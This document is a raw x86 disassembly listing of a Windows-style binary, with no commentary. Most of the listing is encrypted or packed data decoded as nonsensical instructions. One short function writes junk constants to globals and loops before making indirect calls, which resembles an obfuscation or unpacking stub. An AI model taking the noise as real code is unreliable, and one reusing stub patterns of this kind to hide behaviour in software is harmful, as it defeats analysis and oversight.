  40d2d4:	mov    cl,BYTE PTR [edi]
  40d2d6:	stc    
  40d2d7:	mov    edi,0x495e4b15
  40d2dc:	sbb    bl,cl
  40d2de:	jbe    0x40d298
  40d2e0:	clc    
  40d2e1:	inc    ebx
  40d2e2:	xor    al,0x4c
  40d2e4:	pop    es
  40d2e5:	adc    BYTE PTR [esi],dl
  40d2e7:	sbb    al,0xa0
  40d2e9:	call   0x5297e1f2
  40d2ee:	test   al,0x9a
  40d2f0:	imul   eax,DWORD PTR [eax+0x5f660a64],0xecbaed5c
  40d2fa:	stos   BYTE PTR es:[edi],al
  40d2fb:	xchg   esi,eax
  40d2fc:	jno    0x40d29f
  40d2fe:	int    0x21
  40d300:	(bad)  
  40d301:	jg     0x40d336
  40d303:	(bad)  
  40d304:	mov    edi,0xab39b8d4
  40d309:	ret    0x516f
  40d30c:	inc    DWORD PTR [ebp+edx*1+0x5bdc4ded]
  40d313:	popf   
  40d314:	aad    0x3c
  40d316:	sbb    dl,dl
  40d318:	inc    BYTE PTR [ecx]
  40d31a:	dec    eax
  40d31b:	sar    BYTE PTR [esi+0x9f8efe5],1
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	or     esi,DWORD PTR [esi]
  40d33a:	sub    al,0x33
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	fadd   st,st(7)
  40d346:	jp     0x40d318
  40d348:	mov    edx,DWORD PTR [edi+0x22bb519]
  40d34e:	mov    dl,0xfa
  40d350:	push   ss
  40d351:	xchg   ebx,eax
  40d352:	sub    dl,dl
  40d354:	neg    bh
  40d356:	in     al,0xfb
  40d358:	aas    
  40d359:	sbb    eax,0xe5206be6
  40d35e:	aaa    
  40d35f:	(bad)  
  40d360:	xor    eax,0x7806f103
  40d365:	jl     0x40d36e
  40d367:	mov    bh,0xaf
  40d369:	pop    es
  40d36a:	(bad)  
  40d36b:	icebp  
  40d36c:	cmp    cl,BYTE PTR [ebp-0x24]
  40d36f:	push   edi
  40d370:	xchg   esi,eax
  40d371:	lods   eax,DWORD PTR ds:[esi]
  40d372:	bound  esp,QWORD PTR ds:0x44a625d0
  40d378:	lock imul ebp,DWORD PTR [edi-0x47d82516],0x1d3c7850
  40d383:	add    esp,DWORD PTR [eax]
  40d385:	push   ds
  40d386:	test   eax,0x76bec02a
  40d38b:	std    
  40d38c:	push   0x3e
  40d38e:	imul   ebp,esp,0xffffffa2
  40d391:	add    DWORD PTR [edi-0x45],edi
  40d394:	xchg   ebx,eax
  40d395:	ret    
  40d396:	hlt    
  40d397:	add    ecx,DWORD PTR [eax+0x6a]
  40d39a:	fsubr  DWORD PTR [edi+0x560d69bb]
  40d3a0:	out    0xf7,al
  40d3a2:	data16 ins BYTE PTR es:[edi],dx
  40d3a4:	les    ecx,FWORD PTR [ebx+0x75]
  40d3a7:	xchg   esi,eax
  40d3a8:	mov    bl,0xa
  40d3aa:	xor    esi,DWORD PTR [esi-0x42]
  40d3ad:	push   esi
  40d3ae:	mov    esi,0xb3b850b1
  40d3b3:	test   eax,0xc21a5992
  40d3b8:	lock dec edx
  40d3ba:	jo     0x40d380
  40d3bc:	cs push edi
  40d3be:	sub    BYTE PTR [edx],0xf7
  40d3c1:	jne    0x40d3c8
  40d3c3:	push   es
  40d3c4:	jne    0x40d378
  40d3c6:	inc    esp
  40d3c7:	mov    ?,WORD PTR [edi+0x59]
  40d3ca:	call   DWORD PTR [ecx+0x40]
  40d3cd:	call   0x9b8c:0xf413ce42
  40d3d4:	xchg   DWORD PTR [edi-0x5eee2923],edi
  40d3da:	ret    
  40d3db:	mov    al,0xc9
  40d3dd:	mov    edx,0xd43a34d7
  40d3e2:	leave  
  40d3e3:	or     BYTE PTR cs:0x4260bc3d,bl
  40d3ea:	iret   
  40d3eb:	ret    
  40d3ec:	xchg   ebx,eax
  40d3ed:	sti    
  40d3ee:	retf   
  40d3ef:	mov    eax,ds:0x1e84d133
  40d3f4:	or     eax,0xca017b0d
  40d3f9:	es ja  0x40d3a1
  40d3fc:	pop    ebp
  40d3fd:	ficomp DWORD PTR [ebx+0x22ab34]
  40d403:	dec    edx
  40d404:	jmp    0x371e:0xc8327daa
  40d40b:	push   ebx
  40d40c:	std    
  40d40d:	push   ebx
  40d40e:	push   es
  40d40f:	and    ch,bl
  40d411:	(bad)  
  40d412:	sbb    BYTE PTR [ecx+edx*1-0x401152cb],bh
  40d419:	lahf   
  40d41a:	div    DWORD PTR [ebp+0x709ea52e]
  40d420:	sbb    al,0x93
  40d422:	enter  0xb6fc,0x7e
  40d426:	dec    edx
  40d427:	hlt    
  40d428:	lds    edi,FWORD PTR [ecx-0x41]
  40d42b:	cld    
  40d42c:	push   ebx
  40d42d:	mov    ds:0x67b5b356,eax
  40d432:	jge    0x40d3bc
  40d434:	das    
  40d435:	cmp    edi,ecx
  40d437:	push   0x8216a17d
  40d43c:	pop    es
  40d43d:	test   BYTE PTR [ebp+ecx*1+0x52],dl
  40d441:	mov    bh,0x57
  40d443:	and    DWORD PTR [ebx],0xe38ca967
  40d449:	sahf   
  40d44a:	int3   
  40d44b:	mov    gs,WORD PTR [ebp-0x1b2c335b]
  40d451:	(bad)  
  40d453:	shl    bh,0xe6
  40d456:	imul   eax,ecx,0x64457038
  40d45c:	xchg   ah,dl
  40d45e:	mov    ebx,0x99403cc8
  40d463:	inc    ecx
  40d464:	xor    esi,ecx
  40d466:	scas   al,BYTE PTR es:[edi]
  40d467:	pop    ss
  40d468:	test   DWORD PTR [ebx],edx
  40d46a:	jno    0x40d46e
  40d46c:	mov    ah,0x13
  40d46e:	cmp    BYTE PTR [eax],ch
  40d470:	adc    DWORD PTR [edi+0x40],esi
  40d473:	in     al,dx
  40d474:	mov    edx,0x657240b8
  40d479:	stos   DWORD PTR es:[edi],eax
  40d47a:	aas    
  40d47b:	ins    DWORD PTR es:[edi],dx
  40d47c:	outs   dx,BYTE PTR ds:[esi]
  40d47d:	mov    ecx,0x321932b2
  40d482:	push   cs
  40d483:	mov    ds,WORD PTR [ebx+0x3f]
  40d486:	sbb    ebx,DWORD PTR [eax+0x74]
  40d489:	jl     0x40d4b5
  40d48b:	or     edi,DWORD PTR [ebx]
  40d48d:	fld    DWORD PTR [edi+eiz*1+0x7db6bfcc]
  40d494:	xchg   ebp,eax
  40d495:	sub    edx,ebp
  40d497:	cmp    al,BYTE PTR [edi+0x53d54b1b]
  40d49d:	ror    DWORD PTR [edx-0x1c568e16],1
  40d4a3:	fistp  QWORD PTR [ebx+0x68dcd772]
  40d4a9:	sub    ebp,DWORD PTR [ecx]
  40d4ab:	arpl   WORD PTR [ebx],dx
  40d4ad:	ror    DWORD PTR [edi],1
  40d4af:	pop    eax
  40d4b0:	push   ecx
  40d4b1:	cmp    eax,0x8ec55f30
  40d4b6:	mov    ah,0xc6
  40d4b8:	jp     0x40d448
  40d4ba:	cmc    
  40d4bb:	rol    BYTE PTR [edi-0x6399f08f],0xa8
  40d4c2:	cmp    eax,0xe56fa5a3
  40d4c7:	and    al,0x35
  40d4c9:	pushf  
  40d4ca:	or     cl,ah
  40d4cc:	adc    eax,0xd8e272df
  40d4d1:	xor    ah,BYTE PTR [esi-0x16ac5727]
  40d4d7:	ins    DWORD PTR es:[edi],dx
  40d4d8:	int    0x2f
  40d4da:	mov    bh,0x40
  40d4dc:	mov    dl,BYTE PTR [eax+0x6d4c9410]
  40d4e2:	(bad)  
  40d4e3:	xchg   esi,eax
  40d4e4:	mov    WORD PTR [edx+0x2ea94a83],?
  40d4ea:	out    0x97,al
  40d4ec:	popf   
  40d4ed:	jecxz  0x40d517
  40d4ef:	sbb    eax,0x7e75ddf6
  40d4f4:	jae    0x40d48f
  40d4f6:	mov    bl,0x7f
  40d4f8:	cs mov dh,0x15
  40d4fb:	push   eax
  40d4fc:	mov    ah,bl
  40d4fe:	dec    ebx
  40d4ff:	fist   DWORD PTR [edi-0x679a8a02]
  40d505:	int    0x1d
  40d507:	xchg   ebx,eax
  40d508:	mov    ah,0x4c
  40d50a:	gs jne 0x40d519
  40d50d:	je     0x40d491
  40d50f:	add    eax,0x1b81fb6d
  40d514:	adc    edi,DWORD PTR [edx+0x5e]
  40d517:	out    0x4b,al
  40d519:	dec    esp
  40d51a:	aaa    
  40d51b:	push   eax
  40d51c:	scas   eax,DWORD PTR es:[edi]
  40d51d:	pop    es
  40d51e:	aas    
  40d51f:	fbstp  TBYTE PTR [edi]
  40d521:	sub    al,0x1a
  40d523:	adc    bh,BYTE PTR [esi-0x45]
  40d526:	xlat   BYTE PTR ds:[ebx]
  40d527:	and    BYTE PTR [ebx+0x5d7fadc7],al
  40d52d:	jmp    0x4150:0xd897996
  40d534:	sbb    edx,DWORD PTR ss:[esi+esi*8]
  40d538:	add    BYTE PTR [ebx+edi*1+0x6f],0x57
  40d53d:	cld    
  40d53e:	out    0x31,al
  40d540:	jle    0x40d59a
  40d542:	retf   
  40d543:	lds    ebx,FWORD PTR [esi-0x5393e9e0]
  40d549:	cmp    al,0x77
  40d54b:	mov    ds:0x756d0f16,eax
  40d550:	sbb    eax,0xb14b9866
  40d555:	add    ah,ch
  40d557:	mov    ecx,0x119ba7ad
  40d55c:	mov    bh,0x61
  40d55e:	cmp    BYTE PTR ds:[ebx],cl
  40d561:	xor    ah,BYTE PTR [ebx-0x10]
  40d564:	and    eax,eax
  40d566:	into   
  40d567:	push   edx
  40d568:	addr16 ret 
  40d56a:	xchg   esp,eax
  40d56b:	popa   
  40d56c:	sbb    DWORD PTR [esi],ecx
  40d56e:	jp     0x40d565
  40d570:	sti    
  40d571:	shl    edx,0x23
  40d574:	and    al,0xab
  40d576:	mov    ds:0x66f5d74f,al
  40d57b:	pop    edx
  40d57c:	scas   al,BYTE PTR es:[edi]
  40d57d:	add    BYTE PTR [ebx+0x80e267d],0xbc
  40d584:	cmp    bl,BYTE PTR [esp+edi*1]
  40d587:	test   DWORD PTR [ecx+0x1c0343b4],ebx
  40d58d:	sbb    cl,BYTE PTR [ebx+0x33]
  40d590:	rol    BYTE PTR [ecx],cl
  40d592:	pop    ebp
  40d593:	hlt    
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4337a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433797,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43379b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4337a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4337e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43379b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433827,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43382f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43375b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4337db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433817,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433817
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433817,edx
  40d64f:	cmp    DWORD PTR ds:0x433817,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433817,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433763,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433763
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433763,edx
  40d68b:	cmp    DWORD PTR ds:0x433763,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433853
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433763,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433767
  40d6b7:	add    eax,DWORD PTR ds:0x43379b
  40d6bd:	mov    ds:0x433767,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0xa0a0482a
  40d6f9:	in     al,0x9c
  40d6fb:	adc    eax,0x7e7e927a
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d752
  40d705:	aaa    
  40d706:	ds add al,0x8
  40d709:	ror    DWORD PTR [ebp-0x179129a7],1
  40d70f:	push   0x1b
  40d711:	mov    ebx,DWORD PTR [ebp+ecx*1+0x6a2be32e]
  40d718:	sbb    al,0xcd
  40d71a:	ret    0x431e
  40d71d:	cmp    ebp,DWORD PTR [ecx]
  40d71f:	sti    
  40d720:	sbb    al,0x88
  40d722:	push   cs
  40d723:	jmp    0x8749:0x9567262a
  40d72a:	clc    
  40d72b:	push   edx
  40d72c:	popa   
  40d72d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d72e:	jecxz  0x40d79d
  40d730:	sub    BYTE PTR [edi-0x1e],dl
  40d733:	fcom   DWORD PTR [esi+0xb232039]
  40d739:	inc    esp
  40d73a:	and    al,al
  40d73c:	inc    edi
  40d73d:	push   ebp
  40d73e:	jecxz  0x40d795
  40d740:	dec    ebp
  40d741:	rol    cl,1
  40d743:	push   ecx
  40d744:	inc    edx
  40d745:	xor    DWORD PTR [edi+0x51],0xffffffa1
  40d749:	sub    al,al
  40d74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d74c:	sbb    edx,eax
  40d74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d74f:	mov    ds:0x1f9199ac,al
  40d754:	fistp  DWORD PTR [ecx]
  40d756:	push   eax
  40d757:	leave  
  40d758:	jb     0x40d731
  40d75a:	int    0x6e
  40d75c:	xchg   ebp,eax
  40d75d:	and    dh,dh
  40d75f:	mov    eax,DWORD PTR [edi-0x23428274]
  40d765:	out    0x95,al
  40d767:	ds push cs
  40d769:	out    0x70,eax
  40d76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d76c:	aaa    
  40d76d:	push   eax
  40d76e:	rcr    BYTE PTR [ecx+0x6e1e6095],0x9c
  40d775:	cmc    
  40d776:	retf   
  40d777:	or     eax,0x677135c8
  40d77c:	stos   BYTE PTR es:[edi],al
  40d77d:	test   BYTE PTR [eax+0x52],dh
  40d780:	push   ebx
  40d781:	mov    eax,ds:0x1bc29b3e
  40d786:	sbb    ah,al
  40d788:	xchg   esp,eax
  40d789:	rcr    BYTE PTR [ebp-0xc],0x1f
  40d78d:	adc    al,ah
  40d78f:	pop    edi
  40d790:	dec    ecx
  40d791:	inc    ecx
  40d792:	xchg   ebx,eax
  40d793:	push   ebp
  40d794:	shl    DWORD PTR [ebx-0x2ccd2553],0x8f
  40d79b:	push   ds
  40d79c:	xchg   edx,eax
  40d79d:	mov    esp,0x989eb807
  40d7a2:	cmp    ebx,DWORD PTR [esi]
  40d7a4:	mov    bh,0xb1
  40d7a6:	sub    ebx,DWORD PTR [esi+ebx*8-0x40194ad2]
  40d7ad:	je     0x40d7d2
  40d7af:	mov    dl,0xd4
  40d7b1:	shl    BYTE PTR [esi+0x67],1
  40d7b4:	add    al,0x50
  40d7b6:	popa   
  40d7b7:	add    al,0xab
  40d7b9:	(bad)  
  40d7ba:	icebp  
  40d7bb:	dec    eax
  40d7bc:	mov    BYTE PTR [edi-0x7169edba],al
  40d7c2:	xor    BYTE PTR [ebp+0x72],ch
  40d7c5:	es mov edi,0x97bb028b
  40d7cb:	add    al,0xcb
  40d7cd:	dec    ebp
  40d7ce:	lods   eax,DWORD PTR ds:[esi]
  40d7cf:	fsub   st,st(7)
  40d7d1:	test   BYTE PTR [edx+edi*2+0x17bb728d],ah
  40d7d8:	mul    ecx
  40d7da:	cmp    BYTE PTR [edi+0x10],cl
  40d7dd:	push   es
  40d7de:	pop    esp
  40d7df:	outs   dx,BYTE PTR ds:[esi]
  40d7e0:	out    dx,al
  40d7e1:	xor    esp,ebx
  40d7e3:	stos   DWORD PTR es:[edi],eax
  40d7e4:	jb     0x40d7bb
  40d7e6:	mov    eax,0xc10fe439
  40d7eb:	aaa    
  40d7ec:	retf   
  40d7ed:	ret    0x2a82
  40d7f0:	retf   
  40d7f1:	ret    
  40d7f2:	enter  0x23dd,0xe7
  40d7f6:	jb     0x40d873
  40d7f8:	xor    al,0xf8
  40d7fa:	mov    ebx,0x16401cfb
  40d7ff:	cmp    BYTE PTR [edi],ah
  40d801:	es mov cl,0x33
  40d804:	cmp    BYTE PTR [ebp+0x15],ah
  40d807:	outs   dx,DWORD PTR ds:[esi]
  40d808:	loope  0x40d7bb
  40d80a:	xor    DWORD PTR [edx+0x2e5379dd],ecx
  40d810:	mov    ch,dl
  40d812:	arpl   WORD PTR [edx-0x63],bx
  40d815:	enter  0x24ae,0xf4
  40d819:	sub    al,0xa9
  40d81b:	and    edi,DWORD PTR [edx-0x75]
  40d81e:	ss call 0xfa672d47
  40d824:	sar    ebx,0x20
  40d827:	mov    bh,0xfa
  40d829:	jns    0x40d822
  40d82b:	in     al,dx
  40d82c:	dec    eax
  40d82d:	or     eax,0x139db27b
  40d832:	push   0xc1569da3
  40d837:	pop    es
  40d838:	sbb    bh,dl
  40d83a:	xchg   ebp,eax
  40d83b:	dec    esp
  40d83c:	or     BYTE PTR [eax-0x1b04687a],ch
  40d842:	scas   eax,DWORD PTR es:[edi]
  40d843:	jl     0x40d7f7
  40d845:	nop
  40d846:	add    BYTE PTR [eax-0x11],dl
  40d849:	xor    al,0x80
  40d84b:	adc    dh,BYTE PTR [eax+0x11a6e5e7]
  40d851:	cmp    eax,0x3c2d3456
  40d856:	ja     0x40d877
  40d858:	loop   0x40d820
  40d85a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d85b:	push   ss
  40d85c:	clc    
  40d85d:	cld    
  40d85e:	js     0x40d84d
  40d860:	loop   0x40d7f5
  40d862:	sahf   
  40d863:	jno    0x40d8b1
  40d865:	mov    ebx,0x21bdc129
  40d86a:	nop
  40d86b:	pop    es
  40d86c:	mov    edx,0xed2f0395
  40d871:	jmp    0x40d850
  40d873:	rcr    esi,1
  40d875:	enter  0xcea6,0xd1
  40d879:	jae    0x40d848
  40d87b:	loopne 0x40d8a7
  40d87d:	adc    ebp,DWORD PTR [edx+0x7d]
  40d880:	dec    esp
  40d881:	mov    ebp,0xa51930aa
  40d886:	ret    0xf659
  40d889:	mov    esp,0x7eac0f64
  40d88e:	gs data16 into 
  40d891:	inc    esp
  40d892:	in     eax,dx
  40d893:	mov    al,0x2e
  40d895:	in     eax,0x5e
  40d897:	and    al,0x9b
  40d899:	push   cs
  40d89a:	icebp  
  40d89b:	add    BYTE PTR [ebx],ch
  40d89d:	or     DWORD PTR [edx],0xffffffc0
  40d8a0:	je     0x40d901
  40d8a2:	repz rol BYTE PTR [ebp-0x60],0x10
  40d8a7:	call   0x9e425ea5
  40d8ac:	dec    edx
  40d8ad:	ins    BYTE PTR es:[edi],dx
  40d8ae:	cmp    BYTE PTR [eax-0x4d],ah
  40d8b1:	out    dx,eax
  40d8b2:	adc    DWORD PTR [edi],eax
  40d8b4:	ret    0xf6d3
  40d8b7:	stos   BYTE PTR es:[edi],al
  40d8b8:	shl    DWORD PTR [esi-0x2b],0x4a
  40d8bc:	je     0x40d90d
  40d8be:	adc    BYTE PTR [ecx-0x5a],0x7f
  40d8c2:	sahf   
  40d8c3:	lods   al,BYTE PTR es:[esi]
  40d8c5:	outs   dx,DWORD PTR ds:[esi]
  40d8c6:	xor    bl,BYTE PTR gs:0x66c34c83
  40d8cd:	lahf   
  40d8ce:	pusha  
  40d8cf:	push   esi
  40d8d0:	not    DWORD PTR [ebx+edi*1]
  40d8d3:	repz bound edx,QWORD PTR gs:[edx]
  40d8d7:	ret    0xbef8
  40d8da:	xor    DWORD PTR [edx+edx*2],edi
  40d8dd:	sbb    al,0x76
  40d8df:	and    edx,DWORD PTR [edx+edx*8-0x5a]
  40d8e3:	rcl    BYTE PTR [esi],1
  40d8e5:	iret   
  40d8e6:	out    0xc4,eax
  40d8e8:	fnsave [edi+0x17]
  40d8eb:	(bad)  [ebx+edx*1-0x442d740f]
  40d8f2:	pop    es
  40d8f3:	xor    eax,0xbc1332b3
  40d8f8:	and    eax,DWORD PTR [ebp-0x344fc7ec]
  40d8fe:	push   cs
  40d8ff:	iret   
  40d900:	outs   dx,BYTE PTR ds:[esi]
  40d901:	xchg   edx,eax
  40d902:	mov    eax,0x226ed20e
  40d907:	shr    BYTE PTR [ebx],0x47
  40d90a:	sti    
  40d90b:	and    edx,ebx
  40d90d:	imul   edi,ebx,0x56
  40d910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d911:	xor    al,0x40
  40d913:	leave  
  40d914:	sbb    DWORD PTR [ebp-0x35],0x2a317e95
  40d91b:	mov    bl,BYTE PTR [eax]
  40d91d:	or     BYTE PTR [esi],0x5
  40d920:	cdq    
  40d921:	mov    bh,0x4e
  40d923:	ficomp DWORD PTR [edi+0x173c428e]
  40d929:	fsub   QWORD PTR [esi]
  40d92b:	int3   
  40d92c:	mov    ds,ebx
  40d92e:	lods   al,BYTE PTR ds:[esi]
  40d92f:	or     cl,dh
  40d931:	aas    
  40d932:	adc    cl,BYTE PTR [edx+0x4183b13]
  40d938:	cmp    al,0x1c
  40d93a:	xor    eax,0xa1a94316
  40d93f:	cli    
  40d940:	mov    esp,0x89b0b20d
  40d945:	add    DWORD PTR [ebx-0xd1607bb],ecx
  40d94b:	add    al,0x0
  40d94d:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  40d953:	adc    BYTE PTR [ebx],dh
  40d955:	mov    DWORD PTR [ebx],0x258e9c6
  40d95b:	add    BYTE PTR [eax],al
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xf32b51ed
  40d96a:	pop    ds
  40d96b:	xlat   BYTE PTR ds:[ebx]
  40d96c:	mov    dh,0x3a
  40d96e:	nop
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d9a1
  40d976:	pop    ds
  40d977:	jnp    0x40d933
  40d979:	loop   0x40d9fa
  40d97b:	or     DWORD PTR [edx+0x51b65873],ecx
  40d981:	fimul  WORD PTR [esi+0x8]
  40d984:	jecxz  0x40d90b
  40d986:	lahf   
  40d987:	(bad)  
  40d988:	jl     0x40d945
  40d98a:	leave  
  40d98b:	popf   
  40d98c:	adc    eax,0xa9079f38
  40d991:	je     0x40d982
  40d993:	fsubr  DWORD PTR [esi-0x70]
  40d996:	jecxz  0x40d938
  40d998:	in     al,dx
  40d999:	pop    esp
  40d99a:	das    
  40d99b:	push   edi
  40d99c:	loop   0x40d9fe
  40d99e:	fmul   st(3),st
  40d9a0:	mov    cl,0x4f
  40d9a2:	mov    ebx,0x70e1ebcc
  40d9a7:	mov    al,ds:0x2fb86dd4
  40d9ac:	js     0x40d9db
  40d9ae:	push   esi
  40d9af:	int3   
  40d9b0:	add    al,0x90
  40d9b2:	call   0x9ad6b625
  40d9b7:	xor    al,0xc7
  40d9b9:	push   cs
  40d9ba:	push   ebx
  40d9bb:	sub    bl,al
  40d9bd:	mov    ebp,0x67876bb5
  40d9c2:	shl    BYTE PTR [ebx+0x22c55881],cl
  40d9c8:	xchg   esp,eax
  40d9c9:	and    eax,0x5388f6bc
  40d9ce:	or     DWORD PTR [edx-0x5f5cc89b],esi
  40d9d4:	push   esp
  40d9d5:	ficom  WORD PTR [eax+0x63]
  40d9d8:	cli    
  40d9d9:	or     ebx,DWORD PTR [edx]
  40d9db:	sub    ch,dh
  40d9dd:	push   esp
  40d9de:	adc    al,0xd7
  40d9e0:	aam    0x62
  40d9e2:	add    eax,0x31031fa3
  40d9e7:	xor    bl,BYTE PTR [ebp+0x6fcbe70e]
  40d9ed:	leave  
  40d9ee:	pop    ss
  40d9ef:	xor    al,0xed
  40d9f1:	sub    ebx,0xffffffc4
  40d9f4:	mov    bl,0x2a
  40d9f6:	sbb    eax,0xc5f3d87f
  40d9fb:	loope  0x40da02
  40d9fd:	test   DWORD PTR [ebp+0x24],esp
  40da00:	call   0xc0d9ab50
  40da05:	add    eax,0xaf6d6573
  40da0a:	inc    edi
  40da0b:	in     al,0xb0
  40da0d:	cmp    ah,bl
  40da0f:	js     0x40d9c3
  40da11:	std    
  40da12:	std    
  40da13:	loope  0x40d9cf
  40da15:	(bad)  
  40da16:	mov    eax,ds:0x44c2af12
  40da1b:	mov    DWORD PTR [ebx-0x3519ee5e],ebp
  40da21:	pop    esi
  40da22:	add    eax,0xdf623f64
  40da27:	sahf   
  40da28:	add    eax,0x3801c7d7
  40da2d:	pop    ebx
  40da2e:	fdiv   DWORD PTR [ecx-0x23]
  40da31:	pop    es
  40da32:	pop    si
  40da34:	pusha  
  40da35:	in     al,0x9f
  40da37:	add    BYTE PTR [ecx+esi*2+0x7e],cl
  40da3b:	xchg   edx,eax
  40da3c:	je     0x40dabc
  40da3e:	mov    cl,0xaa
  40da40:	cli    
  40da41:	enter  0x31b3,0x57
  40da45:	and    al,0x56
  40da47:	xor    al,0xfe
  40da49:	lods   eax,DWORD PTR ds:[esi]
  40da4a:	cmp    DWORD PTR [esi-0x2a779039],eax
  40da50:	ret    
  40da51:	ins    DWORD PTR es:[edi],dx
  40da52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da53:	mov    ds:0x73a9dade,al
  40da58:	scas   al,BYTE PTR es:[edi]
  40da59:	cmc    
  40da5a:	inc    ecx
  40da5b:	mov    edx,esp
  40da5d:	fcmovb st,st(5)
  40da5f:	aad    0xd8
  40da61:	or     dh,BYTE PTR [ecx]
  40da63:	shr    ecx,0x6f
  40da66:	dec    ebp
  40da67:	ret    
  40da68:	aad    0x32
  40da6a:	int3   
  40da6b:	call   0x1abe:0x56583311
  40da72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da73:	and    ah,BYTE PTR [ebx-0x5c7c1f26]
  40da79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da7a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40da7c:	ret    0xd8f6
  40da7f:	mov    eax,ds:0xbcbff8ad
  40da84:	std    
  40da85:	and    dl,BYTE PTR [esi-0x18c6c3d]
  40da8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da8c:	mov    ebp,esp
  40da8e:	arpl   WORD PTR [edi],dx
  40da90:	jecxz  0x40daa0
  40da92:	jmp    0x65a80d56
  40da97:	cmp    al,0x85
  40da99:	imul   esp,ebx,0x66606557
  40da9f:	leave  
  40daa0:	jle    0x40da4c
  40daa2:	jmp    0xb5a8f9b4
  40daa7:	mul    DWORD PTR [ebp+edx*8-0x17]
  40daab:	xor    ebp,DWORD PTR [edi+0x27605c9]
  40dab1:	out    0xb6,eax
  40dab3:	mov    eax,ds:0x55d62ad0
  40dab8:	in     al,0x56
  40daba:	ins    BYTE PTR es:[edi],dx
  40dabb:	and    al,0xb6
  40dabd:	sbb    DWORD PTR [ebp+0x2078d661],eax
  40dac3:	pushf  
  40dac4:	add    BYTE PTR [ecx-0x6cfa0fd],0x66
  40dacb:	fwait
  40dacc:	pop    ss
  40dacd:	pop    ss
  40dace:	test   al,0x63
  40dad0:	or     BYTE PTR [ecx+0x50],ah
  40dad3:	es stc 
  40dad5:	xor    BYTE PTR [esi+0x66],dl
  40dad8:	mov    al,ds:0xbdbfd03d
  40dadd:	sbb    al,0xae
  40dadf:	and    esi,DWORD PTR [eax+edx*8+0x55ce818b]
  40dae6:	(bad)  
  40dae7:	ret    
  40dae8:	and    cl,BYTE PTR [ebp+ebx*2-0x73d73c3d]
  40daef:	push   edx
  40daf0:	and    ebx,0x69b364c2
  40daf6:	sub    eax,0x14e8394f
  40dafb:	pop    esp
  40dafc:	popa   
  40dafd:	xchg   edx,eax
  40dafe:	aad    0xf3
  40db00:	(bad)  
